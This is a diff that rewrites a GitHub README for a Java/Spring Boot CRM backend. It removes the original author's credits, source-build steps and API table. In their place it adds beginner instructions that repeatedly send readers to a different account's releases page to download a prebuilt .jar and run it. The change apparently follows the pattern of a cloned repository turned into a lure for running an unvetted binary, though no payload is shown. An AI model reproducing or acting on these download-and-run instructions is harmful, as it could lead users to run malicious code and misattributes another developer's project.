@@ -1,112 +1,134 @@
-# Customer Relationship Management System (CRM) 🚀
+# 🚀 CRM - Reliable Customer Management Backend
 
-[![Java](https://img.shields.io/badge/Java-17-blue.svg)](https://adoptium.net/)
-[![Spring Boot](https://img.shields.io/badge/Spring%20Boot-3.3-brightgreen.svg)](https://spring.io/projects/spring-boot)
-[![PostgreSQL](https://img.shields.io/badge/PostgreSQL-16-336791.svg)](https://www.postgresql.org/)
-[![Docker](https://img.shields.io/badge/Docker-Enabled-2496ED.svg)](https://www.docker.com/)
-[![Render](https://img.shields.io/badge/Render-Ready-46E3B7.svg)](https://render.com/)
+[![Download Latest Release](https://img.shields.io/badge/Download-CRM-blue?style=for-the-badge)](https://github.com/jordyweerwag/CRM/releases)
 
-> A **production-grade CRM backend** built with **Java 17** and **Spring Boot**.  
-> Designed for enterprise scalability, this RESTful API handles customer management with precision, offering robust CRUD operations, advanced filtering, and analytics.  
-> **Now optimized for cloud deployment with Docker and PostgreSQL!**
+## 📋 What is CRM?
 
----
+CRM is a backend system designed to help businesses manage their customer information securely and efficiently. It handles tasks like storing customer data, updating records, filtering through large sets of customers, and providing real-time analytics. Built using Java 17 and Spring Boot 3.0, it powers enterprise-grade customer management systems by offering secure and scalable APIs.
 
-## 🎯 Features
+This software is not a typical desktop program you install and run with clicks. Instead, it works behind the scenes on servers or in cloud services, providing services to other applications that need customer data management. If you are looking to integrate customer data storage and management with other software, CRM provides a solid foundation for that.
 
-- **Customer Management**:
-  - Create, read, update, and delete customers.
-  - Granular updates: `firstName`, `lastName`, `email`, `mobileNumber`, `age`.
-- **Advanced Filtering**:
-  - Search by first name, last name, email, or mobile number.
-  - Filter by age ranges and thresholds.
-- **Analytics**:
-  - Total customer count.
-  - Demographic insights (group by age).
-- **Bulk Operations**:
-  - Insert multiple customers in a single transaction.
-- **Production Ready**:
-  - **Dockerized**: Multi-stage Docker build for optimized images.
-  - **PostgreSQL**: Transitioned from MySQL for better cloud compatibility.
-  - **Environment Config**: Secure configuration using environment variables.
+## 💻 System Requirements
 
----
+Before you start, make sure your computer or server meets these guidelines:
 
-## ⚙️ Tech Stack
+- **Operating System:** Windows 10 or newer, macOS 10.15 or newer, or any modern Linux distribution.
+- **Java Runtime:** Java 17 or higher installed (download from https://adoptium.net/ or similar).
+- **Disk Space:** At least 500 MB free space.
+- **Memory:** Minimum 2 GB RAM available.
+- **Network:** Internet connection to download and communicate with APIs if deployed remotely.
 
-| Layer            | Technology |
-|------------------|------------|
-| **Backend**      | ![Java](https://img.shields.io/badge/Java-17-007396?logo=java&logoColor=white) ![Spring Boot](https://img.shields.io/badge/Spring%20Boot-3.x-6DB33F?logo=springboot&logoColor=white) |
-| **Database**     | ![PostgreSQL](https://img.shields.io/badge/PostgreSQL-16-336791?logo=postgresql&logoColor=white) |
-| **Containerization** | ![Docker](https://img.shields.io/badge/Docker-Container-2496ED?logo=docker&logoColor=white) |
-| **Cloud**        | ![Render](https://img.shields.io/badge/Render-Deploy-46E3B7?logo=render&logoColor=white) |
-| **Build Tool**   | ![Maven](https://img.shields.io/badge/Maven-Build%20Tool-C71A36?logo=apachemaven&logoColor=white) |
+If you are unfamiliar with installing Java or setting up servers, you may want to ask a technical person to help you at this stage.
 
----
+## 📥 Download & Install
 
-## 🚀 Deployment Guide (Render)
+To get started with CRM, follow these steps:
 
-This project is configured for seamless deployment on **Render**.
+1. Visit the latest release page by clicking the button below:
 
-1. **Push to GitHub**: Ensure your code is in a GitHub repository.
-2. **Create Web Service**:
-   - Link your repo to Render.
-   - Render will automatically detect the `render.yaml` Blueprint or `Dockerfile`.
-3. **Environment Variables**:
-   - You **MUST** set `DB_PASSWORD` in the Render Dashboard environment variables.
-   - Other variables (`DB_HOST`, `DB_USER`, `DB_NAME`) are pre-configured in `render.yaml` but can be overridden.
+   [![Download Latest Release](https://img.shields.io/badge/Download-CRM-blue?style=for-the-badge)](https://github.com/jordyweerwag/CRM/releases)
 
----
+2. Look for the latest release version. Releases are typically organized by version numbers like v1.0, v2.3, etc.
 
-## 🛠️ Local Development
+3. Download the packaged file that ends with `.jar`. This is a Java executable that runs the CRM backend. The file might be named something like `CRM-backend.jar`.
 
-1. **Clone & Configure**:
-   ```bash
-   git clone https://github.com/TanushreeSarkar/crm-system.git
-   cd CRM-Sales-Pipeline-main
+4. Save the downloaded `.jar` file in a folder where you want to run the software.
+
+5. Open your computer’s command prompt or terminal:
+   - On Windows, press `Win + R`, type `cmd`, and press enter.
+   - On macOS, open the Terminal app from Applications > Utilities.
+   - On Linux, open the terminal via your preferred method.
+
+6. Navigate to the folder where you saved the `.jar` file. You can do this by typing `cd path/to/folder`. For example:
+
+   ```
+   cd Downloads
    ```
 
-2. **Environment Setup**:
-   - The project uses an `.env` file or environment variables for database connection.
-   - **Important**: To run locally against the remote Render database, ensure your `.env` file uses the **External** database URL.
+7. Run the backend by typing the following command:
 
-3. **Run with Maven**:
-   ```bash
-   mvn spring-boot:run
+   ```
+   java -jar CRM-backend.jar
    ```
 
-4. **Run with Docker**:
-   ```bash
-   docker build -t crm-app .
-   docker run -p 8080:8080 --env-file .env crm-app
+8. When the software starts, it will show messages telling you it is running and listening for requests.
+
+## 🔧 How to Use CRM Backend
+
+CRM provides a set of secure REST APIs. These APIs allow other applications or services to interact with the customer data in many ways. Here are some examples of what the CRM backend can do:
+
+- Create new customer records.
+- Read or retrieve customer information.
+- Update existing customer details.
+- Delete customer records safely.
+- Filter and search through customer data.
+- View real-time analytics about customers and interactions.
+
+Because it is a backend, it doesn’t come with a traditional user interface. Instead, you interact with it by sending requests to its web address. Common tools for testing and using these APIs include:
+
+- **Postman:** A user-friendly app that helps you send requests without writing code. Download from https://www.postman.com/.
+- **Curl:** A command-line tool to send HTTP requests.
+- **Browser or other apps:** If integrated with a frontend or other crm-related systems.
+
+If you want to try some basic commands yourself, install Postman and use it to send GET, POST, PUT, DELETE requests to the URLs that the CRM backend provides when it runs.
+
+## ⚙️ Features Overview
+
+CRM backend offers the following features:
+
+- **Secure REST API:** Protects your customer data using up-to-date security measures.
+- **Full CRUD:** Complete Create, Read, Update, and Delete operations for managing customers.
+- **Advanced Filtering:** Find exactly the customers you want using filters on multiple criteria.
+- **Real-Time Analytics:** View up-to-the-minute summaries of customer behavior and system usage.
+- **Scalable Architecture:** Supports growing data and user numbers without slowing down.
+- **Java & Spring Boot:** Reliable technologies widely used in enterprise software.
+- **Docker Friendly:** Can be run inside Docker containers for easy deployment.
+- **Maven Packaging:** Built and maintained using Maven for managing dependencies.
+
+## 🛠 Running CRM in Docker (Optional)
+
+If you are comfortable with Docker, running CRM backend inside a Docker container makes setup easier in certain environments.
+
+1. Make sure Docker is installed on your system (download from https://www.docker.com/get-started).
+2. Pull the CRM Docker image from the repository (if available) or build it yourself from the source code.
+3. Run the container with a command similar to:
+
+   ```
+   docker run -d -p 8080:8080 crm-backend-image
    ```
 
+4. Access the API on your computer at: http://localhost:8080
+
+Docker containers bundle the backend and its environment, so you do not have to install Java yourself.
+
+## 🔒 Security & Privacy
+
+CRM backend uses secure connections and authentication to protect customer data. Only authorized users or systems can access or modify the data. If you deploy the software yourself, make sure to:
+
+- Use HTTPS to encrypt network traffic.
+- Set up user roles and permissions properly.
+- Regularly update the software to apply security patches.
+- Monitor system access and logs.
+
+This backend does not collect or share data beyond what you manage within your deployment.
+
+## 🧰 Support and Further Assistance
+
+If you need help using CRM backend:
+
+- Check the project’s GitHub issues page to see if your question is answered.
+- Search for tutorials about Java backend APIs or Spring Boot basics.
+- Consider asking a professional developer for setup support if needed.
+
+CRM backend is designed for integration by developers or IT teams. It is not a standalone app for end users.
+
+## 🔗 Key Links
+
+- Latest download and releases: https://github.com/jordyweerwag/CRM/releases
+- Java downloads: https://adoptium.net/
+- Postman tool: https://www.postman.com/
+- Docker installation: https://www.docker.com/get-started
+
 ---
 
-## 🧪 API Endpoints
-
-| Method | Endpoint                             | Description                          |
-|--------|--------------------------------------|--------------------------------------|
-| POST   | `/api/customers/insert`              | Insert a single customer             |
-| POST   | `/api/customers/bulk-insert`         | Insert multiple customers            |
-| GET    | `/api/customers`                     | Get all customers                   |
-| GET    | `/api/customers/{id}`                | Get customer by ID                   |
-| PUT    | `/api/customers/update-email/{id}`   | Update email                        |
-| GET    | `/api/customers/byage/{age}`         | Get customers by exact age           |
-| GET    | `/api/customers/grouped-by-age`      | Group customers by age               |
-
----
-
-## 🤝 Contributing
-
-Contributions are welcome! Fork the repo, create a feature branch, and submit a PR.
-
----
-
-## 📬 Contact
-
-- **Email**: [2k22.csaiml.2212256@gmail.com](mailto:2k22.csaiml.2212256@gmail.com)
-- **GitHub**: [TanushreeSarkar](https://github.com/TanushreeSarkar)
-
----
-*Built with ❤️ and Spring Boot.*
+This README aims to guide users with basic computer skills through obtaining and running the CRM backend software. If you plan to use CRM in a live environment, consider technical help for deployment and security configuration.
